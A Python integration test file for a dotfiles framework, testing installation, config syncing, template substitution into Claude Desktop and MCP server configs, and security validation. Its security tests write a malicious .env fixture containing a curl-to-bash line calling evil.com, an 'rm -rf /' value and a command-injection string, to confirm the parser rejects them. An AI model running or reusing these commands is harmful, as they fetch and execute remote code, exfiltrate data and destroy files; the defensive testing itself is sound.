#!/usr/bin/env python3
"""
End-to-end integration tests for the dotfiles framework.
Tests complete workflows including quick_install, sync operations, and template processing.
"""

import os
import sys
import tempfile
import shutil
import subprocess
import json
from pathlib import Path
import unittest
from unittest.mock import patch, MagicMock

# Add repository root to path
repo_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(repo_root))
import config_parser


class TestQuickInstallWorkflow(unittest.TestCase):
    """Test the complete quick_install workflow."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.test_home = tempfile.mkdtemp()
        self.original_home = os.environ.get('HOME')
        
        # Set test HOME
        os.environ['HOME'] = self.test_home
        
        # Create a test repository structure
        self.repo_dir = Path(self.test_dir) / "test-repo"
        self.repo_dir.mkdir()
        
        # Create basic repository files
        self.create_test_repository()
        
    def tearDown(self):
        """Clean up test environment."""
        if self.original_home:
            os.environ['HOME'] = self.original_home
        shutil.rmtree(self.test_dir)
        shutil.rmtree(self.test_home)
        
    def create_test_repository(self):
        """Create a minimal test repository structure."""
        # Create dotfiles.conf
        dotfiles_conf = self.repo_dir / "dotfiles.conf"
        dotfiles_conf.write_text("""# Test dotfiles configuration
HOME/.env.example:.config/dotfiles/.env.example
llm/claude_desktop/claude_desktop_config_basic.json:Library/Application Support/Claude/claude_desktop_config.json
llm/claude_code/CLAUDE.md:.claude/CLAUDE.md
""")
        
        # Create HOME directory structure
        home_dir = self.repo_dir / "HOME"
        home_dir.mkdir()
        env_example = home_dir / ".env.example"
        env_example.write_text("""# Example environment file
HOME=/home/user
API_KEY=your_api_key_here
DATABASE_URL=postgresql://localhost/db
""")
        
        # Create LLM configs
        llm_dir = self.repo_dir / "llm"
        llm_dir.mkdir()
        
        # Claude Desktop config
        claude_desktop_dir = llm_dir / "claude_desktop"
        claude_desktop_dir.mkdir()
        claude_config = claude_desktop_dir / "claude_desktop_config_basic.json"
        claude_config.write_text(json.dumps({
            "mcpServers": {
                "filesystem": {
                    "command": "npx",
                    "args": ["${HOME}/Projects", "${HOME}/Documents"]
                }
            }
        }, indent=2))
        
        # Claude Code config
        claude_code_dir = llm_dir / "claude_code"
        claude_code_dir.mkdir()
        claude_md = claude_code_dir / "CLAUDE.md"
        claude_md.write_text("# Test CLAUDE.md\nTest configuration for Claude Code.")
        
        # Create install.sh
        install_sh = self.repo_dir / "install.sh"
        install_sh.write_text("""#!/bin/bash
# Minimal install.sh for testing
echo "Test install.sh loaded"

quick_install() {
    echo "Running quick_install..."
    return 0
}

sync_dotfiles_from_git() {
    echo "Syncing dotfiles..."
    return 0
}

install_shell_integration() {
    echo "Installing shell integration..."
    echo "# Test integration" >> ~/.profile
    return 0
}
""")
        install_sh.chmod(0o755)
        
        # Create config_parser.py (copy from actual or mock)
        config_parser_py = self.repo_dir / "config_parser.py"
        actual_parser = repo_root / "config_parser.py"
        if actual_parser.exists():
            shutil.copy(actual_parser, config_parser_py)
        else:
            # Create minimal mock
            config_parser_py.write_text("#!/usr/bin/env python3\nprint('Mock config_parser')")
        
    def test_quick_install_components(self):
        """Test that quick_install executes all required components."""
        # Change to repo directory
        original_cwd = os.getcwd()
        os.chdir(self.repo_dir)
        
        try:
            # Run quick_install simulation
            result = subprocess.run(
                ['bash', '-c', 'source ./install.sh && quick_install'],
                capture_output=True,
                text=True,
                env={**os.environ, 'HOME': self.test_home}
            )
            
            self.assertEqual(result.returncode, 0, f"quick_install failed: {result.stderr}")
            self.assertIn("quick_install", result.stdout)
            
            # Check that shell integration was attempted
            profile_path = Path(self.test_home) / ".profile"
            if profile_path.exists():
                profile_content = profile_path.read_text()
                self.assertIn("integration", profile_content)
                
        finally:
            os.chdir(original_cwd)
            
    def test_full_sync_workflow(self):
        """Test complete sync workflow with template processing."""
        # Create Claude config directory
        claude_dir = Path(self.test_home) / "Library" / "Application Support" / "Claude"
        claude_dir.mkdir(parents=True)
        
        # Create environment file
        env_dir = Path(self.test_home) / ".config" / "dotfiles"
        env_dir.mkdir(parents=True)
        env_file = env_dir / ".env"
        env_file.write_text(f"""HOME={self.test_home}
API_KEY=test_api_key
DATABASE_URL=postgresql://localhost/testdb
""")
        
        # Change to repo directory
        os.chdir(self.repo_dir)
        
        # Parse config
        config = config_parser.DotfilesConfig(self.repo_dir / "dotfiles.conf")
        config.parse_config()
        config.backup_dir = Path(self.test_dir) / "backup"
        
        # Perform sync
        with patch('sys.stdout') as mock_stdout:
            result = config_parser.sync_from_repo(config, force=True, process_templates=True)
            
        self.assertEqual(result, 0)
        
        # Verify files were synced
        synced_claude_config = claude_dir / "claude_desktop_config.json"
        self.assertTrue(synced_claude_config.exists())
        
        # Verify .env.example was synced
        synced_env_example = env_dir / ".env.example"
        self.assertTrue(synced_env_example.exists())
        
        # Verify CLAUDE.md was synced
        synced_claude_md = Path(self.test_home) / ".claude" / "CLAUDE.md"
        self.assertTrue(synced_claude_md.exists())


class TestTemplateProcessingIntegration(unittest.TestCase):
    """Test template processing in real-world scenarios."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.test_home = tempfile.mkdtemp()
        self.original_home = os.environ.get('HOME')
        
        os.environ['HOME'] = self.test_home
        
        # Patch Path.home()
        self.home_patcher = patch('pathlib.Path.home')
        self.mock_home = self.home_patcher.start()
        self.mock_home.return_value = Path(self.test_home)
        
    def tearDown(self):
        """Clean up test environment."""
        self.home_patcher.stop()
        if self.original_home:
            os.environ['HOME'] = self.original_home
        shutil.rmtree(self.test_dir)
        shutil.rmtree(self.test_home)
        
    def test_claude_desktop_config_processing(self):
        """Test processing of Claude Desktop configuration."""
        # Create template
        template_content = {
            "mcpServers": {
                "filesystem": {
                    "command": "npx",
                    "args": [
                        "-y",
                        "@modelcontextprotocol/server-filesystem",
                        "${HOME}/Documents",
                        "${HOME}/Downloads",
                        "${HOME}/Projects"
                    ]
                },
                "memory": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-memory"],
                    "env": {
                        "MEMORY_DIR": "${HOME}/Library/Application Support/Claude/memory"
                    }
                },
                "github": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-github"],
                    "env": {
                        "GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_TOKEN}"
                    }
                }
            }
        }
        
        template_file = Path(self.test_dir) / "claude_config.json"
        template_file.write_text(json.dumps(template_content, indent=2))
        
        # Create environment file
        env_dir = Path(self.test_home) / ".config" / "dotfiles"
        env_dir.mkdir(parents=True)
        env_file = env_dir / ".env"
        env_file.write_text(f"""HOME={self.test_home}
GITHUB_TOKEN=ghp_test_token_123
""")
        
        # Process template
        result = config_parser.process_template_file(
            template_file,
            config_parser.get_secrets_files()
        )
        
        # For this test, we'll mock envsubst since it might not be available
        if not shutil.which('envsubst'):
            # Mock the processing
            processed_content = template_file.read_text()
            processed_content = processed_content.replace('${HOME}', str(self.test_home))
            processed_content = processed_content.replace('${GITHUB_TOKEN}', 'ghp_test_token_123')
            template_file.write_text(processed_content)
            result = True
            
        if result:
            # Verify processing
            processed = json.loads(template_file.read_text())
            
            # Check filesystem paths were expanded
            fs_args = processed["mcpServers"]["filesystem"]["args"]
            self.assertEqual(fs_args[2], f"{self.test_home}/Documents")
            self.assertEqual(fs_args[3], f"{self.test_home}/Downloads")
            self.assertEqual(fs_args[4], f"{self.test_home}/Projects")
            
            # Check memory env was expanded
            memory_env = processed["mcpServers"]["memory"]["env"]
            self.assertEqual(memory_env["MEMORY_DIR"], 
                           f"{self.test_home}/Library/Application Support/Claude/memory")
            
            # Check GitHub token was expanded
            github_env = processed["mcpServers"]["github"]["env"]
            self.assertEqual(github_env["GITHUB_PERSONAL_ACCESS_TOKEN"], "ghp_test_token_123")
            
    def test_environment_precedence_integration(self):
        """Test environment file precedence in real scenarios."""
        # Create both global and local env files
        global_env = Path(self.test_home) / ".env"
        global_env.write_text("""# Global environment
HOME=/global/home
API_KEY=global_api_key
SHARED_VAR=from_global
GLOBAL_ONLY=global_value
""")
        
        local_env_dir = Path(self.test_home) / ".config" / "dotfiles"
        local_env_dir.mkdir(parents=True)
        local_env = local_env_dir / ".env"
        local_env.write_text(f"""# Local environment
HOME={self.test_home}
API_KEY=local_api_key
SHARED_VAR=from_local
LOCAL_ONLY=local_value
""")
        
        # Create template using various variables
        template_content = {
            "paths": {
                "home": "${HOME}",
                "data": "${HOME}/data"
            },
            "credentials": {
                "api_key": "${API_KEY}",
                "shared": "${SHARED_VAR}",
                "global": "${GLOBAL_ONLY}",
                "local": "${LOCAL_ONLY}"
            }
        }
        
        template_file = Path(self.test_dir) / "test_template.json"
        template_file.write_text(json.dumps(template_content, indent=2))
        
        # Analyze environment
        has_templates, required_vars, available_vars = config_parser.analyze_template_environment(
            template_file,
            config_parser.get_secrets_files()
        )
        
        self.assertTrue(has_templates)
        self.assertEqual(required_vars, {"HOME", "API_KEY", "SHARED_VAR", "GLOBAL_ONLY", "LOCAL_ONLY"})
        
        # Verify all variables are available
        for var in required_vars:
            self.assertIn(var, available_vars)


class TestErrorRecoveryIntegration(unittest.TestCase):
    """Test error recovery and rollback in integration scenarios."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.test_home = tempfile.mkdtemp()
        self.original_home = os.environ.get('HOME')
        
        os.environ['HOME'] = self.test_home
        
    def tearDown(self):
        """Clean up test environment."""
        if self.original_home:
            os.environ['HOME'] = self.original_home
        shutil.rmtree(self.test_dir)
        shutil.rmtree(self.test_home)
        
    def test_sync_failure_recovery(self):
        """Test recovery from sync failures."""
        # Create config
        config_file = Path(self.test_dir) / "dotfiles.conf"
        config_file.write_text("""HOME/file1:.file1
HOME/file2:.file2
HOME/missing:.missing
""")
        
        # Create only some source files
        home_dir = Path(self.test_dir) / "HOME"
        home_dir.mkdir()
        (home_dir / "file1").write_text("content1")
        (home_dir / "file2").write_text("content2")
        # file3 is missing - should cause partial failure
        
        # Create existing destination file
        dest_file1 = Path(self.test_home) / ".file1"
        dest_file1.write_text("existing content")
        
        config = config_parser.DotfilesConfig(config_file)
        config.parse_config()
        config.backup_dir = Path(self.test_dir) / "backup"
        
        # Perform sync - should partially succeed
        with patch('sys.stdout') as mock_stdout:
            result = config_parser.sync_from_repo(config, force=True)
            
        # Should complete but report missing file
        self.assertEqual(result, 1)  # Error due to missing file
        
        # But successful files should still be synced
        self.assertTrue(dest_file1.exists())
        self.assertEqual(dest_file1.read_text(), "content1")
        
        dest_file2 = Path(self.test_home) / ".file2"
        self.assertTrue(dest_file2.exists())
        self.assertEqual(dest_file2.read_text(), "content2")
        
    def test_template_processing_failure_recovery(self):
        """Test recovery from template processing failures."""
        # Create multiple templates, one will fail
        templates = []
        
        for i in range(3):
            template_file = Path(self.test_dir) / f"template{i}.json"
            if i == 1:
                # This one will have invalid content
                template_file.write_text('{"key": "${MISSING_VAR_THAT_CAUSES_FAILURE}"}')
            else:
                template_file.write_text(f'{{"key": "value{i}"}}')
            templates.append((f"template{i}.json", f".config{i}.json"))
            
            # Create destination files
            dest_file = Path(self.test_home) / f".config{i}.json"
            dest_file.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy(template_file, dest_file)
            
        # Create config object
        config = config_parser.DotfilesConfig()
        
        # Mock environment file exists
        with patch('config_parser.get_secrets_files', return_value=["/fake/.env"]):
            with patch('config_parser.process_template_file') as mock_process:
                # Make the second template fail
                mock_process.side_effect = [True, False, True]
                
                result = config_parser.process_synced_templates(templates, config)
                
        # Should report failure but continue processing others
        self.assertEqual(result, 1)
        
        # Verify all templates were attempted
        self.assertEqual(mock_process.call_count, 3)


class TestSecurityIntegrationScenarios(unittest.TestCase):
    """Test security features in real-world integration scenarios."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.test_home = tempfile.mkdtemp()
        self.original_home = os.environ.get('HOME')
        
        os.environ['HOME'] = self.test_home
        
    def tearDown(self):
        """Clean up test environment."""
        if self.original_home:
            os.environ['HOME'] = self.original_home
        shutil.rmtree(self.test_dir)
        shutil.rmtree(self.test_home)
        
    def test_malicious_environment_rejection(self):
        """Test that malicious environment files are rejected in integration."""
        # Create malicious environment file
        env_dir = Path(self.test_home) / ".config" / "dotfiles"
        env_dir.mkdir(parents=True)
        
        malicious_env = env_dir / ".env"
        malicious_env.write_text("""# Malicious environment file
HOME=/home/user
API_KEY=$(curl evil.com/steal-data | bash)
NORMAL_VAR=normal_value
EVIL_CMD=`rm -rf /`
""")
        
        # Create template
        template_file = Path(self.test_dir) / "template.json"
        template_file.write_text('{"home": "${HOME}", "key": "${API_KEY}", "cmd": "${EVIL_CMD}"}')
        
        # Attempt to process - should fail validation
        result = config_parser.process_template_file(
            template_file,
            [str(malicious_env)]
        )
        
        self.assertFalse(result, "Should reject malicious environment file")
        
        # Template should remain unchanged
        self.assertIn("${API_KEY}", template_file.read_text())
        
    def test_safe_subprocess_execution(self):
        """Test that subprocess execution is properly secured."""
        # Create safe environment
        env_file = Path(self.test_dir) / ".env"
        env_file.write_text("""HOME=/home/user
USER_INPUT=safe value; echo "attempted injection"
QUOTED_VAR="value with spaces"
""")
        
        template_file = Path(self.test_dir) / "template.sh"
        template_file.write_text("""#!/bin/bash
echo "Home: ${HOME}"
echo "Input: ${USER_INPUT}"
echo "Quoted: ${QUOTED_VAR}"
""")
        
        # Process template with subprocess mocking
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0,
                stdout="""#!/bin/bash
echo "Home: /home/user"
echo "Input: safe value; echo "attempted injection""
echo "Quoted: value with spaces"
"""
            )
            
            result = config_parser.process_template_file(template_file, [str(env_file)])
            
            self.assertTrue(result)
            
            # Verify subprocess was called safely
            call_args = mock_run.call_args
            
            # Should not use shell=True
            self.assertNotEqual(call_args.kwargs.get('shell'), True)
            
            # Arguments should be a list, not a string
            self.assertIsInstance(call_args.args[0], list)


if __name__ == '__main__':
    unittest.main()